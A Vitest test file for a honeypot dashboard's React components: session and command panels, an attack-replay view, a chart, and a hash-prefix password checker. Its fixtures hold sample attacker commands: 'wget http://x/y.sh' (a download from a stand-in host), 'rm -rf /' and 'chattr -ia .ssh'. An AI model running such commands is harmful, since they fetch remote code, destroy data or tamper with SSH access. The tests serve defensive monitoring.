import { describe, it, expect, vi, afterEach } from "vitest";
import { render, screen, fireEvent, within, waitFor } from "@testing-library/react";
import ErrorBoundary from "../components/common/ErrorBoundary";
import SessionsPanel from "../components/SessionsPanel";
import SessionDrawer from "../components/SessionDrawer";
import CommandsPanel from "../components/CommandsPanel";
import EventsPanel from "../components/EventsPanel";
import FeaturedAttack from "../components/FeaturedAttack";
import PasswordCheck from "../components/PasswordCheck";
import AreaSparkline from "../components/common/AreaSparkline";

const noop = () => {};
const fmtTs = (t) => (t ? `TS:${t}` : "—");
const fmtDur = (ms) => `${Math.round((ms || 0) / 1000)}s`;
const flag = () => "🏴";

const SESSION = {
  session_id: "abc123",
  src_ip: "1.2.3.4",
  country_iso: "CN",
  city: "Beijing",
  org: "Chinanet",
  started_at: "2026-08-16T10:00:00Z",
  duration_ms: 30000,
  events: 6,
  commands: 3,
  logins: 2,
};

const panelProps = {
  sessions: [SESSION],
  sessionsTotal: 1,
  sessionsError: "",
  sessionsLoading: false,
  search: "",
  onSearch: noop,
  onOpen: noop,
  formatTimestamp: fmtTs,
  formatDuration: fmtDur,
  countryFlag: flag,
  isMobile: false,
};

describe("ErrorBoundary", () => {
  it("contains a crashing panel and leaves siblings rendered", () => {
    const Boom = () => { throw new Error("kaboom"); };
    vi.spyOn(console, "error").mockImplementation(() => {});
    render(
      <div>
        <ErrorBoundary name="Top commands"><Boom /></ErrorBoundary>
        <p>sibling survived</p>
      </div>
    );
    expect(screen.getByRole("alert")).toHaveTextContent("Top commands failed to render");
    expect(screen.getByText("sibling survived")).toBeInTheDocument();
    vi.restoreAllMocks();
  });

  it("renders children untouched when nothing throws", () => {
    render(<ErrorBoundary name="X"><p>fine</p></ErrorBoundary>);
    expect(screen.getByText("fine")).toBeInTheDocument();
    expect(screen.queryByRole("alert")).toBeNull();
  });
});

describe("SessionsPanel", () => {
  it("exposes each session through a keyboard-reachable control", () => {
    const onOpen = vi.fn();
    render(<SessionsPanel {...panelProps} onOpen={onOpen} />);
    // A <tr onClick> alone is mouse-only; the row must offer a real button.
    const btn = screen.getByRole("button", { name: /view timeline for session from 1\.2\.3\.4/i });
    fireEvent.click(btn);
    expect(onOpen).toHaveBeenCalledWith("abc123");
  });

  it("distinguishes an empty search result from having no data at all", () => {
    const { rerender } = render(<SessionsPanel {...panelProps} sessions={[]} search="zzz" />);
    expect(screen.getByText(/no sessions match that search/i)).toBeInTheDocument();
    rerender(<SessionsPanel {...panelProps} sessions={[]} search="" />);
    expect(screen.getByText(/no sessions in the last 24 hours/i)).toBeInTheDocument();
  });

  it("shows an error without hiding the panel", () => {
    render(<SessionsPanel {...panelProps} sessions={[]} sessionsError="boom" />);
    expect(screen.getByText(/failed to load sessions: boom/i)).toBeInTheDocument();
  });

  it("renders the mobile layout only, not both at once", () => {
    const { container } = render(<SessionsPanel {...panelProps} isMobile />);
    expect(container.querySelector("table")).toBeNull();
    expect(screen.getByRole("button", { name: /1\.2\.3\.4/ })).toBeInTheDocument();
  });
});

describe("SessionDrawer", () => {
  const data = {
    session: { ...SESSION, truncated: false },
    events: [
      { timestamp: "2026-08-16T10:00:00Z", command: null, username: null, password: null, tags: [] },
      { timestamp: "2026-08-16T10:00:05Z", command: null, username: "root", password: "123456", tags: [] },
      { timestamp: "2026-08-16T10:00:20Z", command: "wget http://x/y.sh", username: null, password: null, tags: ["T1105"] },
    ],
  };
  const mitreById = { T1105: { id: "T1105", name: "Ingress Tool Transfer (T1105)", badgeColor: "" } };

  const drawerProps = {
    data, loading: false, error: "", onClose: noop,
    formatTimestamp: fmtTs, formatDuration: fmtDur, countryFlag: flag, mitreById,
  };

  it("renders the timeline as connect, login, then command with its technique", () => {
    render(<SessionDrawer {...drawerProps} />);
    const dialog = screen.getByRole("dialog", { name: /session timeline/i });
    expect(within(dialog).getByText("session opened")).toBeInTheDocument();
    expect(within(dialog).getByText("root / 123456")).toBeInTheDocument();
    expect(within(dialog).getByText("wget http://x/y.sh")).toBeInTheDocument();
    expect(within(dialog).getByText(/ingress tool transfer/i)).toBeInTheDocument();
  });

  it("moves focus to the close button so keyboard users land inside", () => {
    render(<SessionDrawer {...drawerProps} />);
    expect(screen.getByRole("button", { name: /close session timeline/i })).toHaveFocus();
  });

  it("restores focus to the opener when unmounted", () => {
    const opener = document.createElement("button");
    document.body.appendChild(opener);
    opener.focus();
    const { unmount } = render(<SessionDrawer {...drawerProps} />);
    expect(opener).not.toHaveFocus();
    unmount();
    expect(opener).toHaveFocus();
    opener.remove();
  });

  it("locks background scrolling while open and releases it after", () => {
    const { unmount } = render(<SessionDrawer {...drawerProps} />);
    expect(document.body.style.overflow).toBe("hidden");
    unmount();
    expect(document.body.style.overflow).not.toBe("hidden");
  });

  it("warns when the timeline was truncated", () => {
    render(<SessionDrawer {...drawerProps} data={{ ...data, session: { ...data.session, truncated: true } }} />);
    expect(screen.getByText(/timeline truncated/i)).toBeInTheDocument();
  });
});

describe("CommandsPanel", () => {
  const props = {
    commands: [{ command: "rm -rf /", total: 5, unique_ips: 2, tags: ["T1490"] }],
    commandsError: "", commandsLoading: false, commandsTotal: 1,
    commandFilter: "all", setCommandFilter: noop, isCommandFilterActive: false,
    commandTagCounts: { T1490: 1, T1105: 0 },
    mitreSignatures: [
      { id: "T1490", name: "Impact (T1490)", description: "d", badgeColor: "" },
      { id: "T1105", name: "Ingress (T1105)", description: "d", badgeColor: "" },
    ],
    mitreById: { T1490: { id: "T1490", name: "Impact (T1490)", badgeColor: "" } },
    search: "", onSearch: noop, pageSize: 100, isMobile: false,
  };

  it("tags rows from the ids the API returns", () => {
    render(<CommandsPanel {...props} />);
    expect(screen.getByText("rm -rf /")).toBeInTheDocument();
    expect(screen.getAllByText("Impact (T1490)").length).toBeGreaterThan(0);
  });

  it("disables technique chips that match nothing", () => {
    render(<CommandsPanel {...props} />);
    expect(screen.getByRole("button", { name: /Ingress \(T1105\) \(0\)/ })).toBeDisabled();
    expect(screen.getByRole("button", { name: /Impact \(T1490\) \(1\)/ })).toBeEnabled();
  });

  it("explains an empty result differently when a filter is active", () => {
    render(<CommandsPanel {...props} commands={[]} isCommandFilterActive commandFilter="T1105" />);
    expect(screen.getByText(/no commands match the current search or filter/i)).toBeInTheDocument();
  });

  it("survives rows the API sent without a tags array", () => {
    // Guards the class of bug that used to blank the page: an unexpected shape.
    render(<CommandsPanel {...props} commands={[{ command: "ls", total: 1, unique_ips: 1 }]} />);
    expect(screen.getByText("ls")).toBeInTheDocument();
  });
});

describe("AreaSparkline", () => {
  const data = [
    { label: "10:00", value: 5 },
    { label: "11:00", value: 20 },
    { label: "12:00", value: 0 },
  ];

  it("describes itself for screen readers instead of being a bare graphic", () => {
    render(<AreaSparkline data={data} />);
    expect(screen.getByRole("img", { name: /events per hour.*peak 20/i })).toBeInTheDocument();
  });

  it("renders nothing rather than an empty axis when there is no data", () => {
    const { container } = render(<AreaSparkline data={[]} />);
    expect(container.querySelector("svg")).toBeNull();
  });

  it("handles an all-zero series without dividing by zero", () => {
    const { container } = render(<AreaSparkline data={[{ label: "a", value: 0 }, { label: "b", value: 0 }]} />);
    const path = container.querySelector("path[stroke='#34d399']");
    expect(path.getAttribute("d")).not.toMatch(/NaN/);
  });

  it("places a single point without producing NaN coordinates", () => {
    const { container } = render(<AreaSparkline data={[{ label: "only", value: 3 }]} />);
    expect(container.querySelector("path").getAttribute("d")).not.toMatch(/NaN/);
  });

  it("maps one svg unit to one pixel so nothing is distorted", () => {
    // The chart used to stretch a fixed 600x200 viewBox to the container with
    // preserveAspectRatio="none", which scales each axis by a different
    // factor: text came out squashed and the hover dot was an ellipse.
    const { container } = render(<AreaSparkline data={data} height={160} />);
    const svg = container.querySelector("svg");
    expect(svg.getAttribute("preserveAspectRatio")).toBeNull();
    const [, , vbW, vbH] = svg.getAttribute("viewBox").split(" ").map(Number);
    expect(vbW).toBe(Number(svg.getAttribute("width")));
    expect(vbH).toBe(Number(svg.getAttribute("height")));
    expect(vbH).toBe(160);
  });

  it("rounds the y-axis up to readable gridline values", () => {
    // A raw peak produces ticks like 0 / 410 / 819 / 1229 / 1638.
    const { container } = render(<AreaSparkline data={[{ label: "a", value: 1638 }]} />);
    const labels = [...container.querySelectorAll("text")].map((t) => t.textContent);
    for (const tick of ["0", "500", "1,000", "1,500", "2,000"]) {
      expect(labels, `expected a ${tick} gridline`).toContain(tick);
    }
  });

  it("still reports the real peak to screen readers, not the rounded axis", () => {
    render(<AreaSparkline data={[{ label: "a", value: 1638 }]} />);
    expect(screen.getByRole("img", { name: /peak 1638/i })).toBeInTheDocument();
  });
});

describe("FeaturedAttack", () => {
  const attack = {
    session: {
      session_id: "abc123", src_ip: "1.2.3.4", country_iso: "CN",
      city: "Beijing", org: "Chinanet", duration_ms: 20000, events: 3,
    },
    events: [
      { timestamp: "2026-08-16T10:00:00Z", command: null, username: null, password: null, tags: [] },
      { timestamp: "2026-08-16T10:00:05Z", command: null, username: "root", password: "123456", tags: [] },
      { timestamp: "2026-08-16T10:00:20Z", command: "wget http://x/y.sh", username: null, password: null, tags: ["T1105"] },
    ],
  };
  const mitreById = { T1105: { id: "T1105", name: "Ingress Tool Transfer (T1105)" } };
  const props = { data: attack, loading: false, error: "", mitreById, countryFlag: flag };

  /** Reduced motion renders the whole session at once, which is deterministic. */
  const realMatchMedia = window.matchMedia;
  const withReducedMotion = () => {
    window.matchMedia = (query) => ({
      matches: query.includes("prefers-reduced-motion"),
      media: query,
      addEventListener: vi.fn(), removeEventListener: vi.fn(),
      addListener: vi.fn(), removeListener: vi.fn(), dispatchEvent: vi.fn(),
    });
  };
  // Without this the stub leaks into every test that runs afterwards.
  afterEach(() => { window.matchMedia = realMatchMedia; });
  // "Already watched" is persisted, so without clearing it the first test to
  // render would silently suppress the animation in every later one.
  beforeEach(() => window.localStorage.clear());

  it("stands down quietly when there is no session to show", () => {
    // /sessions/featured 404s on a quiet week. That is not an error worth
    // showing a visitor an error box for.
    const { container } = render(<FeaturedAttack {...props} data={null} error="API error 404" />);
    expect(container).toBeEmptyDOMElement();
  });

  it("renders nothing rather than an empty terminal for a session with no events", () => {
    const { container } = render(<FeaturedAttack {...props} data={{ session: attack.session, events: [] }} />);
    expect(container).toBeEmptyDOMElement();
  });

  it("identifies the attacker behind the session", () => {
    render(<FeaturedAttack {...props} />);
    expect(screen.getByText(/1\.2\.3\.4/)).toBeInTheDocument();
    expect(screen.getByText(/Chinanet/)).toBeInTheDocument();
  });

  it("plays the whole session at once when motion is reduced", () => {
    withReducedMotion();
    render(<FeaturedAttack {...props} />);
    // Every line present immediately, no animation to wait on.
    expect(screen.getByText(/connection opened/)).toBeInTheDocument();
    expect(screen.getByText("root / 123456")).toBeInTheDocument();
    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
    expect(screen.getByText(/session ended/)).toBeInTheDocument();
  });

  it("offers a replay once it has finished", () => {
    withReducedMotion();
    render(<FeaturedAttack {...props} />);
    expect(screen.getByRole("button", { name: /replay/i })).toBeInTheDocument();
  });

  it("lists the techniques the session used", () => {
    withReducedMotion();
    render(<FeaturedAttack {...props} />);
    expect(screen.getByTitle("Ingress Tool Transfer (T1105)")).toBeInTheDocument();
  });

  it("links through to the full timeline", () => {
    withReducedMotion();
    const onOpenFull = vi.fn();
    render(<FeaturedAttack {...props} onOpenFull={onOpenFull} />);
    fireEvent.click(screen.getByRole("button", { name: /full timeline/i }));
    expect(onOpenFull).toHaveBeenCalledWith("abc123");
  });

  it("survives an event the API sent without a tags array", () => {
    withReducedMotion();
    render(<FeaturedAttack {...props} data={{
      session: attack.session,
      events: [{ timestamp: "2026-08-16T10:00:00Z", command: "ls", username: null, password: null }],
    }} />);
    expect(screen.getByText("ls")).toBeInTheDocument();
  });

  it("animates on a first visit", () => {
    render(<FeaturedAttack {...props} />);
    // Mid-playback: the closing marker only appears once the replay finishes.
    expect(screen.queryByText(/session ended/)).toBeNull();
    expect(screen.getByRole("button", { name: /pause/i })).toBeInTheDocument();
  });

  it("collapses on a repeat visit", () => {
    // The tallest panel on the page, and the returning viewer has already read
    // it — it should not be in the way of everything below it.
    window.localStorage.setItem("hunajapannu:replayed-session", "abc123");
    render(<FeaturedAttack {...props} />);
    expect(screen.getByRole("button", { name: /show/i })).toBeInTheDocument();
    // Header stays: which attacker this was is the point of the summary.
    expect(screen.getByText(/1\.2\.3\.4/)).toBeInTheDocument();
    // Transcript and technique badges are folded away.
    expect(screen.queryByTitle("Ingress Tool Transfer (T1105)")).toBeNull();
    expect(screen.getByText(/session ended/)).not.toBeVisible();
  });

  it("shows the finished transcript, not the animation, when reopened", () => {
    // The annoyance this exists to fix: watching the same typing animation
    // every single time you open the page.
    window.localStorage.setItem("hunajapannu:replayed-session", "abc123");
    render(<FeaturedAttack {...props} />);
    fireEvent.click(screen.getByRole("button", { name: /show/i }));
    expect(screen.getByText("wget http://x/y.sh")).toBeVisible();
    expect(screen.getByText(/session ended/)).toBeVisible();
    expect(screen.getByRole("button", { name: /replay/i })).toBeInTheDocument();
  });

  it("expands on a first visit", () => {
    render(<FeaturedAttack {...props} />);
    expect(screen.getByRole("button", { name: /hide/i })).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /show/i })).toBeNull();
  });

  it("stops playback when collapsed, so it is not half over on reopening", () => {
    render(<FeaturedAttack {...props} />);
    fireEvent.click(screen.getByRole("button", { name: /hide/i }));
    fireEvent.click(screen.getByRole("button", { name: /show/i }));
    expect(screen.getByRole("button", { name: /play/i })).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /pause/i })).toBeNull();
  });

  it("animates again when a genuinely different session is featured", () => {
    window.localStorage.setItem("hunajapannu:replayed-session", "some-older-session");
    render(<FeaturedAttack {...props} />);
    expect(screen.queryByText(/session ended/)).toBeNull();
  });

  it("records the session so the next visit does not replay it", () => {
    render(<FeaturedAttack {...props} />);
    expect(window.localStorage.getItem("hunajapannu:replayed-session")).toBe("abc123");
  });

  it("can be skipped to the end mid-playback", () => {
    render(<FeaturedAttack {...props} />);
    fireEvent.click(screen.getByRole("button", { name: /skip/i }));
    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
    expect(screen.getByText(/session ended/)).toBeInTheDocument();
    expect(screen.queryByRole("button", { name: /skip/i })).toBeNull();
  });

  it("still renders when localStorage throws (private mode)", () => {
    const spy = vi.spyOn(Storage.prototype, "getItem").mockImplementation(() => {
      throw new Error("denied");
    });
    expect(() => render(<FeaturedAttack {...props} />)).not.toThrow();
    expect(screen.getByText(/1\.2\.3\.4/)).toBeInTheDocument();
    spy.mockRestore();
  });

  it("collapses events ingested more than once", () => {
    // A 2026-08-09 session holds twelve exact copies of every event. Replaying
    // "chattr -ia .ssh" twelve times reads as a broken page, not an attack.
    withReducedMotion();
    const dup = { timestamp: "2026-08-16T10:00:20Z", command: "chattr -ia .ssh", username: null, password: null, tags: ["T1098"] };
    render(<FeaturedAttack {...props} data={{ session: attack.session, events: [dup, dup, dup, dup] }} />);
    expect(screen.getAllByText("chattr -ia .ssh")).toHaveLength(1);
  });

  it("keeps a command genuinely run twice at different times", () => {
    // Same text, different instant — that is a real repeat, not a duplicate.
    withReducedMotion();
    render(<FeaturedAttack {...props} data={{
      session: attack.session,
      events: [
        { timestamp: "2026-08-16T10:00:20Z", command: "ls", username: null, password: null, tags: [] },
        { timestamp: "2026-08-16T10:00:25Z", command: "ls", username: null, password: null, tags: [] },
      ],
    }} />);
    expect(screen.getAllByText("ls")).toHaveLength(2);
  });
});

describe("PasswordCheck", () => {
  // sha256("123456") = 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92
  const HASH = "8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92";
  const props = {
    endpoint: "/api/public/cowrie/passwords/range",
    formatNumber: (n) => String(n),
    uniqueCredCount: 203819,
  };

  const typeAndCheck = async (value) => {
    fireEvent.change(screen.getByLabelText(/password to check/i), { target: { value } });
    fireEvent.click(screen.getByRole("button", { name: /^check$/i }));
  };

  // No crypto stub: the test environment has real WebCrypto, so these
  // exercise the actual SHA-256 and the real prefix/suffix split rather than
  // a mock that would happily agree with a broken implementation.
  afterEach(() => { vi.restoreAllMocks(); });

  it("sends only the hash prefix, never the password", async () => {
    // The entire premise of the feature. If this regresses it becomes a
    // credential-harvesting form.
    const fetchMock = vi.fn(() =>
      Promise.resolve({ ok: true, json: () => Promise.resolve({ prefix: "8d9", results: [] }) })
    );
    global.fetch = fetchMock;

    render(<PasswordCheck {...props} />);
    await typeAndCheck("123456");
    await waitFor(() => expect(fetchMock).toHaveBeenCalled());

    const url = String(fetchMock.mock.calls[0][0]);
    // 3 characters, not 5: at this corpus size a 5-char prefix returned
    // exactly one hash, so the anonymity set was the caller alone.
    expect(url).toBe("/api/public/cowrie/passwords/range/8d9");
    expect(url).not.toContain("123456");
    // No body, no second argument carrying one.
    expect(fetchMock.mock.calls[0][1]).toBeUndefined();
  });

  it("reports a match found in the returned range", async () => {
    global.fetch = vi.fn(() =>
      Promise.resolve({
        ok: true,
        json: () => Promise.resolve({
          prefix: "8d9",
          results: [{ suffix: HASH.slice(3), pairs: 3, attempts: 4812, usernames: ["root", "admin"] }],
        }),
      })
    );
    render(<PasswordCheck {...props} />);
    await typeAndCheck("123456");
    expect(await screen.findByText(/seen 4812 times/i)).toBeInTheDocument();
    expect(screen.getByText("root")).toBeInTheDocument();
  });

  it("says so when the prefix comes back with no matching suffix", async () => {
    // The server answers identically whether or not the password is present;
    // only the local suffix comparison decides.
    global.fetch = vi.fn(() =>
      Promise.resolve({
        ok: true,
        json: () => Promise.resolve({
          prefix: "8d9",
          results: [{ suffix: "a".repeat(61), pairs: 1, attempts: 1, usernames: ["x"] }],
        }),
      })
    );
    render(<PasswordCheck {...props} />);
    await typeAndCheck("123456");
    expect(await screen.findByText(/not in this corpus/i)).toBeInTheDocument();
  });

  it("surfaces a failed lookup instead of implying the password is safe", async () => {
    global.fetch = vi.fn(() => Promise.resolve({ ok: false, status: 500 }));
    render(<PasswordCheck {...props} />);
    await typeAndCheck("123456");
    expect(await screen.findByRole("alert")).toHaveTextContent(/API error 500/);
    expect(screen.queryByText(/not in this corpus/i)).toBeNull();
  });

  it("masks the field by default and can reveal it", () => {
    render(<PasswordCheck {...props} />);
    const input = screen.getByLabelText(/password to check/i);
    expect(input).toHaveAttribute("type", "password");
    fireEvent.click(screen.getByRole("button", { name: /show/i }));
    expect(input).toHaveAttribute("type", "text");
  });

  it("warns against entering a password actually in use", () => {
    render(<PasswordCheck {...props} />);
    expect(screen.getByText(/don't type a password you currently use/i)).toBeInTheDocument();
  });

  it("will not submit an empty value", () => {
    global.fetch = vi.fn();
    render(<PasswordCheck {...props} />);
    expect(screen.getByRole("button", { name: /^check$/i })).toBeDisabled();
    expect(global.fetch).not.toHaveBeenCalled();
  });
});

describe("EventsPanel", () => {
  const events = [{
    timestamp: "2026-08-16T10:00:00Z", src_ip: "1.2.3.4", dest_port: 22,
    username: "root", password: "123456", command: "wget http://x/y.sh",
    session_id: "s1", country_iso: "CN",
  }];
  const props = {
    events, eventLimit: 50, formatTimestamp: fmtTs,
    renderGeoPill: (ev) => <span>{ev.country_iso}</span>,
  };

  it("fills its grid cell instead of leaving dead space below the rows", () => {
    // The panel sits beside a column of six stacked panels, so the grid
    // stretches it far taller than its own content. Without a flex column the
    // frame was drawn full height with the table stopping partway down.
    const { container } = render(<EventsPanel {...props} />);
    const root = container.firstChild;
    expect(root.className).toMatch(/\bflex\b/);
    expect(root.className).toMatch(/\bflex-col\b/);
    expect(root.className).toMatch(/\bh-full\b/);
  });

  const EVENTS = [
    { timestamp: "2026-08-16T10:00:00Z", src_ip: "1.1.1.1", dest_port: 22,
      username: null, password: null, command: null, session_id: "a", country_iso: "CN" },
    { timestamp: "2026-08-16T10:00:05Z", src_ip: "2.2.2.2", dest_port: 22,
      username: "root", password: "123456", command: null, session_id: "b", country_iso: "CN" },
    { timestamp: "2026-08-16T10:00:10Z", src_ip: "3.3.3.3", dest_port: 22,
      username: null, password: null, command: "wget http://x/y.sh", session_id: "c", country_iso: "CN" },
  ];

  it("weights rows by what actually happened", () => {
    // Most rows are a bot connecting and trying one password. The few that ran
    // commands used to look identical, which buried the only interesting thing
    // on the page in a hundred rows of noise.
    const { container } = render(<EventsPanel {...props} events={EVENTS} />);
    const rows = [...container.querySelectorAll("tbody tr")];
    expect(rows).toHaveLength(3);
    const [connect, login, command] = rows;
    expect(connect.className).toMatch(/opacity-55/);
    expect(login.className).not.toMatch(/opacity-55/);
    expect(command.className).toMatch(/bg-emerald-500/);
    expect(command.className).not.toMatch(/opacity-55/);
  });

  it("drops the table for cards on a phone", () => {
    // A seven-column nowrap table on a 390px screen is a side-scrolling strip.
    const { container } = render(<EventsPanel {...props} events={EVENTS} isMobile />);
    expect(container.querySelector("table")).toBeNull();
    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
    expect(screen.getByText("root / 123456")).toBeInTheDocument();
    expect(screen.getByText(/connection only/)).toBeInTheDocument();
  });

  it("does not force a minimum width that would overflow a narrow phone", () => {
    // min-w-[320px] plus page padding overflows a 320px viewport.
    const { container } = render(<EventsPanel {...props} isMobile />);
    expect(container.firstChild.className).not.toMatch(/min-w-\[/);
  });

  it("renders an event row", () => {
    render(<EventsPanel {...props} />);
    expect(screen.getByText("1.2.3.4")).toBeInTheDocument();
    expect(screen.getByText("wget http://x/y.sh")).toBeInTheDocument();
  });

  it("shows the waiting message when there is nothing yet", () => {
    render(<EventsPanel {...props} events={[]} />);
    expect(screen.getByText(/waiting for attackers/i)).toBeInTheDocument();
  });
});
